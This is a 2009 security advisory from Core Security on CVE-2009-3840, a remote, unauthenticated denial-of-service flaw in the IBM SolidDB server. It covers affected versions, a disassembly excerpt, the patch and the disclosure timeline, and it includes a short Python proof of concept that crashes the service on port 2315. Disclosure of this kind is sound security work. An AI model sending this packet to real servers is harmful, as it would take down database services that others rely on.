1. Advisory Information
 
Title: IBM SolidDB invalid error code vulnerability
Advisory Id: CORE-2009-1027
Advisory URL: http://www.coresecurity.com/content/ibm-soliddb-errorcode-dos
Date published: 2009-11-18
Date of last update: 2009-11-18
Vendors contacted: IBM
Release mode: Forced release
2. Vulnerability Information
 
Class: External Initialization of Trusted Variables [CWE-454]
Impact: Denial of Service
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A
CVE Name: CVE-2009-3840
3. Vulnerability Description
 
SolidDB is an in-memory relational database from IBM with over 3,000,000 deployments [1]. It is used as an embedded database by independent software vendors of enterprise applications, telecommunications and embedded software and systems. IBM reports SolidDB as being used in mission-critical applications from Cisco, HP, Alcatel and Nokia Siemens. The in-memory database is also used as core component of IBM SolidDB Universal Cache, a performance improvement application for relational databases such as DB2, Microsoft SQL Server, Oracle and Informix.
 
A remotely exploitable vulnerability was found in the database server core component. Exploitation of this bug does not require authentication and will lead to a remotely triggered denial of service of the database service. It is not likely that this bug could be otherwise exploited to compromise systems running vulnerable versions of SolidDB. Core&#039;s security advisory CORE-2009-0814 refers to this vulnerability in HP OpenView Network Node Manager [2]
4. Vulnerable packages
 
    * IBM SolidDB Server 6.30.0.29
    * IBM SolidDB Server 6.30.0.33
    * Other versions may be vulnerable but were not tested by Core.
 
5. Non-vulnerable packages
 
    * IBM SolidDB Server 6.30.0.37
 
6. Vendor Information, Solutions and Workarounds
 
IBM has issued the SolidDB and SolidDB Universal Cache 6.3 Fix Pack 3 which addresses this problem. It is available for download from the vendor&#039;s Fix
 
 
7. Credits
 
This vulnerability was discovered and researched by Dami?n Frizza from Core Security Technologies.
8. Technical Description / Proof of Concept Code
 
IBM SolidDB server listens and accepts remote connections on port 2315/tcp. The service is implemented by solid.exe which is started automatically on boot. For certain transactions, upon receiving a packet from the network the service will attempt to determine and display an error code string based on an error code number specified in the packet. By sending a specially crafted packet with an invalid error code number it is possible to trigger an exception that forces abnormal termination of the service. It is unlikely that the bug could be exploited for anything other than a remote denial of service.
 
The following code excerpt explains the problem:
0061611F   0FB65424 02      MOVZX EDX,BYTE PTR SS:[ESP+2]
00616124   0FBF4C24 03      MOVSX ECX,WORD PTR SS:[ESP+3]

00616134   8B5424 07        MOV EDX,DWORD PTR SS:[ESP+7]
00616138   894E 14          MOV DWORD PTR DS:[ESI+14],ECX

The following python code can be used to reproduce the bug:
 
#!python
import socket
import struct
 
#maxlen 0xA
a =  struct.pack(&#039;<b&#039;, 2)
a += struct.pack(&#039;<H&#039;, 0)
a += struct.pack(&#039;<H&#039;,0xFEFF)
a += struct.pack(&#039;<H&#039;,0xFEFF)
a += "1234"
 
target_ip = &#039;X.X.X.X&#039;
 
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect ((target_ip, 2315))
 
s.send(a)
s.close()
 
 
9. Report Timeline
 
    * 2009-10-23: Core Security Technologies sends an email to IBM AIX Security team requesting a security point of contact to report security bugs in SolidDB and asks whether the report should be sent to SolidDB security instead.
    * 2009-10-27: IBM AIX Security replies indicating that they forwarded the request to SolidDB&#039;s development team.
    * 2009-10-27: SolidDB&#039;s QA Manager contacts Core acknowledging the request originally sent to AIX Security and indicating that although there isn&#039;t an established formal channel to report security bugs in SolidDB the report could be sent directly to him.
    * 2009-11-10: Core sends the advisory with full technical details to SolidDB team and informs that its publication is set to December 7th, 2009, and that the date is subject to be changed if publication of patches is coordinated at agreed upon date between Core and IBM SolidDB. Core requests confirmation that a SolidDB OEM customer [2] has already reported the bug and received patches.
    * 2009-11-17: IBM SolidDB publishes patches to the vulnerable products.
    * 2009-11-18: Advisory CORE-2009-1027 published.
